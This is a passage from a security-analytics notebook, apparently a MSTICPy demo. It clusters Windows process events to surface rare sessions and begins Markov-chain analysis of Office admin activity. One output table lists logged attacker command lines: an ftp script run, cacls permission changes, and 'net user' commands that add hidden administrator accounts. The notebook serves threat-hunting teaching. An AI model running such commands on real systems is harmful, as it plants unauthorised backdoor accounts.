       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow11_col3\" class=\"data row11 col3\" >7</td>\n",
       "            </tr>\n",
       "            <tr>\n",
       "                        <th id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9blevel0_row12\" class=\"row_heading level0 row12\" >6</th>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow12_col0\" class=\"data row12 col0\" >MSTICAdmin</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow12_col1\" class=\"data row12 col1\" >0x527d50d</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow12_col2\" class=\"data row12 col2\" >0.0588235</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow12_col3\" class=\"data row12 col3\" >3</td>\n",
       "            </tr>\n",
       "            <tr>\n",
       "                        <th id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9blevel0_row13\" class=\"row_heading level0 row13\" >1</th>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow13_col0\" class=\"data row13 col0\" >LOCAL SERVICE</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow13_col1\" class=\"data row13 col1\" >0x3e5</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow13_col2\" class=\"data row13 col2\" >0.0384615</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow13_col3\" class=\"data row13 col3\" >26</td>\n",
       "            </tr>\n",
       "            <tr>\n",
       "                        <th id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9blevel0_row14\" class=\"row_heading level0 row14\" >14</th>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow14_col0\" class=\"data row14 col0\" >MSTICAlertsWin1$</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow14_col1\" class=\"data row14 col1\" >0x3e7</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow14_col2\" class=\"data row14 col2\" >0.012226</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow14_col3\" class=\"data row14 col3\" >14508</td>\n",
       "            </tr>\n",
       "            <tr>\n",
       "                        <th id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9blevel0_row15\" class=\"row_heading level0 row15\" >13</th>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow15_col0\" class=\"data row15 col0\" >MSTICAlertsWin1$</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow15_col1\" class=\"data row15 col1\" >0x3e4</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow15_col2\" class=\"data row15 col2\" >0.00463584</td>\n",
       "                        <td id=\"T_878761ce_9c82_11eb_a51b_000d3af5dc9brow15_col3\" class=\"data row15 col3\" >8197</td>\n",
       "            </tr>\n",
       "    </tbody></table>"
      ],
      "text/plain": [
       "<pandas.io.formats.style.Styler at 0x7f3d56525c10>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "from msticpy.sectools.eventcluster import dbcluster_events, add_process_features, char_ord_score\n",
    "from collections import Counter\n",
    "\n",
    "print(f\"Input data: {len(processes_on_host)} events\")\n",
    "print(\"Extracting features...\", end=\"\")\n",
    "feature_procs = add_process_features(input_frame=processes_on_host, path_separator=\"\\\\\")\n",
    "\n",
    "feature_procs[\"accountNum\"] = feature_procs.apply(\n",
    "    lambda x: char_ord_score(x.Account), axis=1\n",
    ")\n",
    "print(\".\", end=\"\")\n",
    "\n",
    "# you might need to play around with the max_cluster_distance parameter.\n",
    "# decreasing this gives more clusters.\n",
    "cluster_columns = [\"commandlineTokensFull\", \"pathScore\", \"accountNum\", \"isSystemSession\"]\n",
    "print(\"done\")\n",
    "print(\"Clustering...\", end=\"\")\n",
    "(clus_events, dbcluster, x_data) = dbcluster_events(\n",
    "    data=feature_procs,\n",
    "    cluster_columns=cluster_columns,\n",
    "    max_cluster_distance=0.0001,\n",
    ")\n",
    "print(\"done\")\n",
    "print(\"Number of input events:\", len(feature_procs))\n",
    "print(\"Number of clustered events:\", len(clus_events))\n",
    "\n",
    "print(\"Merging with source data and computing rarity...\", end=\"\")\n",
    "\n",
    "# Join the clustered results back to the original process frame\n",
    "procs_with_cluster = feature_procs.merge(\n",
    "    clus_events[[*cluster_columns, \"ClusterSize\"]],\n",
    "    on=[\"commandlineTokensFull\", \"accountNum\", \"pathScore\", \"isSystemSession\"],\n",
    ")\n",
    "\n",
    "# Compute Process pattern Rarity = inverse of cluster size\n",
    "procs_with_cluster[\"Rarity\"] = 1 / procs_with_cluster[\"ClusterSize\"]\n",
    "# count the number of processes for each logon ID\n",
    "lgn_proc_count = (\n",
    "    pd.concat(\n",
    "        [\n",
    "            processes_on_host.groupby(\"TargetLogonId\")[\"TargetLogonId\"].count(),\n",
    "            processes_on_host.groupby(\"SubjectLogonId\")[\"SubjectLogonId\"].count(),\n",
    "        ]\n",
    "    ).sum(level=0)\n",
    ").to_dict()\n",
    "print(\"done\")\n",
    "# Display the results\n",
    "md(\"<br><hr>Sessions ordered by process rarity\", \"large, bold\")\n",
    "md(\"Higher score indicates higher number of unusual processes\")\n",
    "process_rarity = (procs_with_cluster.groupby([\"SubjectUserName\", \"SubjectLogonId\"])\n",
    "    .agg({\"Rarity\": \"mean\", \"TimeGenerated\": \"count\"})\n",
    "    .rename(columns={\"TimeGenerated\": \"ProcessCount\"})\n",
    "    .reset_index())\n",
    "display(\n",
    "    process_rarity\n",
    "    .sort_values(\"Rarity\", ascending=False)\n",
    "    .style.bar(subset=[\"Rarity\"], color=\"#d65f5f\")\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {
    "gather": {
     "logged": 1618337003076
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<p style='font-weight: bold'>20 processes executed in 1.323 sec</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.dataresource+json": {
       "data": [
        {
         "CommandLine": "ftp  -s:MG06.dll",
         "TimeGenerated": "2019-02-12T20:30:17.307Z",
         "index": 22656
        },
        {
         "CommandLine": "cacls.exe  C:\\Windows\\system32\\cscript.exe /e /t /g SYSTEM:F",
         "TimeGenerated": "2019-02-12T20:30:18.187Z",
         "index": 22657
        },
        {
         "CommandLine": "net  users ",
         "TimeGenerated": "2019-02-12T20:30:18.277Z",
         "index": 22658
        },
        {
         "CommandLine": "findstr  \"abai$\"",
         "TimeGenerated": "2019-02-12T20:30:18.290Z",
         "index": 22659
        },
        {
         "CommandLine": "C:\\Windows\\system32\\net1  users ",
         "TimeGenerated": "2019-02-12T20:30:18.317Z",
         "index": 22660
        },
        {
         "CommandLine": "net  user abai$ [Placeholder] /add",
         "TimeGenerated": "2019-02-12T20:30:18.377Z",
         "index": 22661
        },
        {
         "CommandLine": "C:\\Windows\\system32\\net1  user abai$ [Placeholder] /add",
         "TimeGenerated": "2019-02-12T20:30:18.387Z",
         "index": 22662
        },
        {
         "CommandLine": "net  user abai$ [Placeholder]",
         "TimeGenerated": "2019-02-12T20:30:18.413Z",
         "index": 22663
        },
        {
         "CommandLine": "C:\\Windows\\system32\\net1  user abai$ [Placeholder]",
         "TimeGenerated": "2019-02-12T20:30:18.427Z",
         "index": 22664
        },
        {
         "CommandLine": "net  localgroup administrators ",
         "TimeGenerated": "2019-02-12T20:30:18.453Z",
         "index": 22665
        },
        {
         "CommandLine": "findstr  \"abai$\"",
         "TimeGenerated": "2019-02-12T20:30:18.460Z",
         "index": 22666
        },
        {
         "CommandLine": "C:\\Windows\\system32\\net1  localgroup administrators ",
         "TimeGenerated": "2019-02-12T20:30:18.470Z",
         "index": 22667
        },
        {
         "CommandLine": "net  localgroup administrators abai$ /add",
         "TimeGenerated": "2019-02-12T20:30:18.493Z",
         "index": 22668
        },
        {
         "CommandLine": "C:\\Windows\\system32\\net1  localgroup administrators abai$ /add",
         "TimeGenerated": "2019-02-12T20:30:18.510Z",
         "index": 22669
        },
        {
         "CommandLine": "net  users ",
         "TimeGenerated": "2019-02-12T20:30:18.550Z",
         "index": 22670
        },
        {
         "CommandLine": "findstr  \"www.401hk.com\"",
         "TimeGenerated": "2019-02-12T20:30:18.557Z",
         "index": 22671
        },
        {
         "CommandLine": "C:\\Windows\\system32\\net1  users ",
         "TimeGenerated": "2019-02-12T20:30:18.563Z",
         "index": 22672
        },
        {
         "CommandLine": "net  user www.401hk.com [Placeholder] /add",
         "TimeGenerated": "2019-02-12T20:30:18.590Z",
         "index": 22673
        },
        {
         "CommandLine": "C:\\Windows\\system32\\net1  user www.401hk.com [Placeholder] /add",
         "TimeGenerated": "2019-02-12T20:30:18.603Z",
         "index": 22674
        },
        {
         "CommandLine": "net  user www.401hk.com [Placeholder]",
         "TimeGenerated": "2019-02-12T20:30:18.630Z",
         "index": 22675
        }
       ],
       "schema": {
        "fields": [
         {
          "name": "index",
          "type": "integer"
         },
         {
          "name": "TimeGenerated",
          "type": "datetime"
         },
         {
          "name": "CommandLine",
          "type": "string"
         }
        ],
        "pandas_version": "0.20.0",
        "primaryKey": [
         "index"
        ]
       }
      },
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>TimeGenerated</th>\n",
       "      <th>CommandLine</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>22656</th>\n",
       "      <td>2019-02-12 20:30:17.307</td>\n",
       "      <td>ftp  -s:MG06.dll</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22657</th>\n",
       "      <td>2019-02-12 20:30:18.187</td>\n",
       "      <td>cacls.exe  C:\\Windows\\system32\\cscript.exe /e /t /g SYSTEM:F</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22658</th>\n",
       "      <td>2019-02-12 20:30:18.277</td>\n",
       "      <td>net  users</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22659</th>\n",
       "      <td>2019-02-12 20:30:18.290</td>\n",
       "      <td>findstr  \"abai$\"</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22660</th>\n",
       "      <td>2019-02-12 20:30:18.317</td>\n",
       "      <td>C:\\Windows\\system32\\net1  users</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22661</th>\n",
       "      <td>2019-02-12 20:30:18.377</td>\n",
       "      <td>net  user abai$ [Placeholder] /add</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22662</th>\n",
       "      <td>2019-02-12 20:30:18.387</td>\n",
       "      <td>C:\\Windows\\system32\\net1  user abai$ [Placeholder] /add</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22663</th>\n",
       "      <td>2019-02-12 20:30:18.413</td>\n",
       "      <td>net  user abai$ [Placeholder]</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22664</th>\n",
       "      <td>2019-02-12 20:30:18.427</td>\n",
       "      <td>C:\\Windows\\system32\\net1  user abai$ [Placeholder]</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22665</th>\n",
       "      <td>2019-02-12 20:30:18.453</td>\n",
       "      <td>net  localgroup administrators</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22666</th>\n",
       "      <td>2019-02-12 20:30:18.460</td>\n",
       "      <td>findstr  \"abai$\"</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22667</th>\n",
       "      <td>2019-02-12 20:30:18.470</td>\n",
       "      <td>C:\\Windows\\system32\\net1  localgroup administrators</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22668</th>\n",
       "      <td>2019-02-12 20:30:18.493</td>\n",
       "      <td>net  localgroup administrators abai$ /add</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22669</th>\n",
       "      <td>2019-02-12 20:30:18.510</td>\n",
       "      <td>C:\\Windows\\system32\\net1  localgroup administrators abai$ /add</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22670</th>\n",
       "      <td>2019-02-12 20:30:18.550</td>\n",
       "      <td>net  users</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22671</th>\n",
       "      <td>2019-02-12 20:30:18.557</td>\n",
       "      <td>findstr  \"www.401hk.com\"</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22672</th>\n",
       "      <td>2019-02-12 20:30:18.563</td>\n",
       "      <td>C:\\Windows\\system32\\net1  users</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22673</th>\n",
       "      <td>2019-02-12 20:30:18.590</td>\n",
       "      <td>net  user www.401hk.com [Placeholder] /add</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22674</th>\n",
       "      <td>2019-02-12 20:30:18.603</td>\n",
       "      <td>C:\\Windows\\system32\\net1  user www.401hk.com [Placeholder] /add</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22675</th>\n",
       "      <td>2019-02-12 20:30:18.630</td>\n",
       "      <td>net  user www.401hk.com [Placeholder]</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                TimeGenerated  \\\n",
       "22656 2019-02-12 20:30:17.307   \n",
       "22657 2019-02-12 20:30:18.187   \n",
       "22658 2019-02-12 20:30:18.277   \n",
       "22659 2019-02-12 20:30:18.290   \n",
       "22660 2019-02-12 20:30:18.317   \n",
       "22661 2019-02-12 20:30:18.377   \n",
       "22662 2019-02-12 20:30:18.387   \n",
       "22663 2019-02-12 20:30:18.413   \n",
       "22664 2019-02-12 20:30:18.427   \n",
       "22665 2019-02-12 20:30:18.453   \n",
       "22666 2019-02-12 20:30:18.460   \n",
       "22667 2019-02-12 20:30:18.470   \n",
       "22668 2019-02-12 20:30:18.493   \n",
       "22669 2019-02-12 20:30:18.510   \n",
       "22670 2019-02-12 20:30:18.550   \n",
       "22671 2019-02-12 20:30:18.557   \n",
       "22672 2019-02-12 20:30:18.563   \n",
       "22673 2019-02-12 20:30:18.590   \n",
       "22674 2019-02-12 20:30:18.603   \n",
       "22675 2019-02-12 20:30:18.630   \n",
       "\n",
       "                                                           CommandLine  \n",
       "22656                                                 ftp  -s:MG06.dll  \n",
       "22657     cacls.exe  C:\\Windows\\system32\\cscript.exe /e /t /g SYSTEM:F  \n",
       "22658                                                      net  users   \n",
       "22659                                                 findstr  \"abai$\"  \n",
       "22660                                 C:\\Windows\\system32\\net1  users   \n",
       "22661                               net  user abai$ [Placeholder] /add  \n",
       "22662          C:\\Windows\\system32\\net1  user abai$ [Placeholder] /add  \n",
       "22663                                    net  user abai$ [Placeholder]  \n",
       "22664               C:\\Windows\\system32\\net1  user abai$ [Placeholder]  \n",
       "22665                                  net  localgroup administrators   \n",
       "22666                                                 findstr  \"abai$\"  \n",
       "22667             C:\\Windows\\system32\\net1  localgroup administrators   \n",
       "22668                        net  localgroup administrators abai$ /add  \n",
       "22669   C:\\Windows\\system32\\net1  localgroup administrators abai$ /add  \n",
       "22670                                                      net  users   \n",
       "22671                                         findstr  \"www.401hk.com\"  \n",
       "22672                                 C:\\Windows\\system32\\net1  users   \n",
       "22673                       net  user www.401hk.com [Placeholder] /add  \n",
       "22674  C:\\Windows\\system32\\net1  user www.401hk.com [Placeholder] /add  \n",
       "22675                            net  user www.401hk.com [Placeholder]  "
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# get the logon ID of the rarest session\n",
    "rarest_logonid = process_rarity[process_rarity[\"Rarity\"] == process_rarity.Rarity.max()].SubjectLogonId.iloc[0]\n",
    "# extract processes with this logonID\n",
    "sample_processes = (\n",
    "    processes_on_host\n",
    "    [processes_on_host[\"SubjectLogonId\"] == rarest_logonid]\n",
    "    [[\"TimeGenerated\", \"CommandLine\"]]\n",
    "    .sort_values(\"TimeGenerated\")\n",
    ")[5:25]\n",
    "# compute duration of session\n",
    "duration = sample_processes.TimeGenerated.max() - sample_processes.TimeGenerated.min()\n",
    "md(f\"{len(sample_processes)} processes executed in {duration.total_seconds()} sec\", \"bold\")\n",
    "display(sample_processes)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Clustering conclusion\n",
    "We have narrowed down the task of sifting through > 20,000 processes \n",
    "to a few 10s and have them grouped into sessions ordered by the\n",
    "relative rarity of the process patterns"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Other Applications\n",
    "\n",
    "You can use this technique on other datasets where you want to group by multiple features of the data.\n",
    "\n",
    "The caveat is that you need to transform any non-numeric data field into a numeric form.\n",
    "\n",
    "msticpy has a few built-in functions to help with this:\n",
    "```python\n",
    "from msticpy.sectools import eventcluster\n",
    "\n",
    "# This will group similar names together (e.g. \"Administrator\" and \"administrator\")\n",
    "my_df[\"account_num\"] = eventcluster.char_ord_score_df(data=my_df, column=\"Account\")\n",
    "\n",
    "# This will create a distinct hash for even minor differences in the input.\n",
    "# This might be useful to detect imperfectly faked UA strings.\n",
    "my_df[\"ua_hash\"] = eventcluster.crc32_hash_df(data=my_df, column=\"UserAgent\")\n",
    "\n",
    "# This will return the number of delimiter chars in the string - often a \n",
    "# a good proxy for the structure of an input while ignoring variable text values\n",
    "# e.g. \n",
    "# \"https://my.dom.com/path1?u1=163.174.4.23\" will produce the same score as\n",
    "# \"https://www.contoso.com/azure?srcdom=moon.base.alpha.com\"\n",
    "# but\n",
    "# \"curl https://www.contoso.com/top/next?u=23 > ~/my_page\"\n",
    "# \"curl https://www.contoso.com/top_next?u=2.3  > ~/my_page.sh\"\n",
    "# will produce different values despite the similarity of the strings.\n",
    "# Note - you can override the default delimiter list of \" \\-/.,\"'|&:;%\\$()]\"\n",
    "my_df[\"request_struct\"] = eventcluster.delim_count_df(my_df, column=\"Request\")\n",
    "```\n",
    "\n",
    "You can use a combination of these and other functions on the same fields\n",
    "to measure different aspects of the data. For example, the following takes\n",
    "a hash of the browser version of the UA (user agent) string and a structural count of\n",
    "the delimiters used.\n",
    "\n",
    "Use the `ua_pref_hash` and `ua_delims` to cluster on identical browser versions that\n",
    "have the same UA string\n",
    "```python\n",
    "my_df[\"ua_prefix\"] = data=my_df[\"UserAgent\"].str.split(\")\")[-1])\n",
    "my_df[\"ua_pref_hash\"] = eventcluster.crc32_hash_df(data=my_df, column=\"ua_prefix\")\n",
    "my_df[\"ua_delims\"] = eventcluster.delim_count_df(data=my_df, column=\"UserAgent\")\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<hr>\n",
    "\n",
    "# Detecting anomalous sequences using Markov Chain\n",
    "\n",
    "The **anomalous_sequence** MSTICPy package uses Markov Chain analysis to predict the probability<br>\n",
    "that a particular sequence of events will occur given what has happened in the past.\n",
    "\n",
    "Here we're applying it to Office activity. \n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Query the data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {
    "gather": {
     "logged": 1617840728875
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Number of events 146\n"
     ]
    },
    {
     "data": {
      "application/vnd.dataresource+json": {
       "data": [
        {
         "ClientIP": "nan",
         "UserId": "NAMPRD06\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)",
         "begin": "2020-06-21T02:36:46.000Z",
         "cmds": [
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy"
         ],
         "duration": "P0DT0H0M0S",
         "end": "2020-06-21T02:36:46.000Z",
         "index": 0,
         "nCmds": 28,
         "nDistinctCmds": 1
        },
        {
         "ClientIP": "nan",
         "UserId": "NAMPRD06\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)",
         "begin": "2020-06-21T05:31:34.000Z",
         "cmds": [
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy"
         ],
         "duration": "P0DT0H0M0S",
         "end": "2020-06-21T05:31:34.000Z",
         "index": 1,
         "nCmds": 28,
         "nDistinctCmds": 1
        },
        {
         "ClientIP": "nan",
         "UserId": "NAMPRD06\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)",
         "begin": "2020-06-22T02:27:06.000Z",
         "cmds": [
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy"
         ],
         "duration": "P0DT0H0M0S",
         "end": "2020-06-22T02:27:06.000Z",
         "index": 2,
         "nCmds": 2,
         "nDistinctCmds": 1
        },
        {
         "ClientIP": "nan",
         "UserId": "NAMPRD06\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)",
         "begin": "2020-06-22T02:30:52.000Z",
         "cmds": [
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy"
         ],
         "duration": "P0DT0H0M0S",
         "end": "2020-06-22T02:30:52.000Z",
         "index": 3,
         "nCmds": 26,
         "nDistinctCmds": 1
        },
        {
         "ClientIP": "nan",
         "UserId": "NAMPRD06\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)",
         "begin": "2020-06-22T04:55:59.000Z",
         "cmds": [
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy",
          "Set-ConditionalAccessPolicy"
         ],
         "duration": "P0DT0H0M0S",
         "end": "2020-06-22T04:55:59.000Z",
         "index": 4,
         "nCmds": 28,
         "nDistinctCmds": 1
        }
       ],
       "schema": {
        "fields": [
         {
          "name": "index",
          "type": "integer"
         },
         {
          "name": "UserId",
          "type": "string"
         },
         {
          "name": "ClientIP",
          "type": "string"
         },
         {
          "name": "nCmds",
          "type": "integer"
         },
         {
          "name": "nDistinctCmds",
          "type": "integer"
         },
         {
          "name": "begin",
          "type": "datetime",
          "tz": "UTC"
         },
         {
          "name": "end",
          "type": "datetime",
          "tz": "UTC"
         },
         {
          "name": "duration",
          "type": "duration"
         },
         {
          "name": "cmds",
          "type": "string"
         }
        ],
        "pandas_version": "0.20.0",
        "primaryKey": [
         "index"
        ]
       }
      },
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>UserId</th>\n",
       "      <th>ClientIP</th>\n",
       "      <th>nCmds</th>\n",
       "      <th>nDistinctCmds</th>\n",
       "      <th>begin</th>\n",
       "      <th>end</th>\n",
       "      <th>duration</th>\n",
       "      <th>cmds</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>NAMPRD06\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)</td>\n",
       "      <td>nan</td>\n",
       "      <td>28</td>\n",
       "      <td>1</td>\n",
       "      <td>2020-06-21 02:36:46+00:00</td>\n",
       "      <td>2020-06-21 02:36:46+00:00</td>\n",
       "      <td>0 days</td>\n",
       "      <td>[Set-ConditionalAccessPolicy, Set-ConditionalAccessPolicy, Set-ConditionalAccessPolicy, Set-Cond...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>NAMPRD06\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)</td>\n",
       "      <td>nan</td>\n",
       "      <td>28</td>\n",
       "      <td>1</td>\n",
       "      <td>2020-06-21 05:31:34+00:00</td>\n",
       "      <td>2020-06-21 05:31:34+00:00</td>\n",
       "      <td>0 days</td>\n",
       "      <td>[Set-ConditionalAccessPolicy, Set-ConditionalAccessPolicy, Set-ConditionalAccessPolicy, Set-Cond...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>NAMPRD06\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)</td>\n",
       "      <td>nan</td>\n",
       "      <td>2</td>\n",
       "      <td>1</td>\n",
       "      <td>2020-06-22 02:27:06+00:00</td>\n",
       "      <td>2020-06-22 02:27:06+00:00</td>\n",
       "      <td>0 days</td>\n",
       "      <td>[Set-ConditionalAccessPolicy, Set-ConditionalAccessPolicy]</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>NAMPRD06\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)</td>\n",
       "      <td>nan</td>\n",
       "      <td>26</td>\n",
       "      <td>1</td>\n",
       "      <td>2020-06-22 02:30:52+00:00</td>\n",
       "      <td>2020-06-22 02:30:52+00:00</td>\n",
       "      <td>0 days</td>\n",
       "      <td>[Set-ConditionalAccessPolicy, Set-ConditionalAccessPolicy, Set-ConditionalAccessPolicy, Set-Cond...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
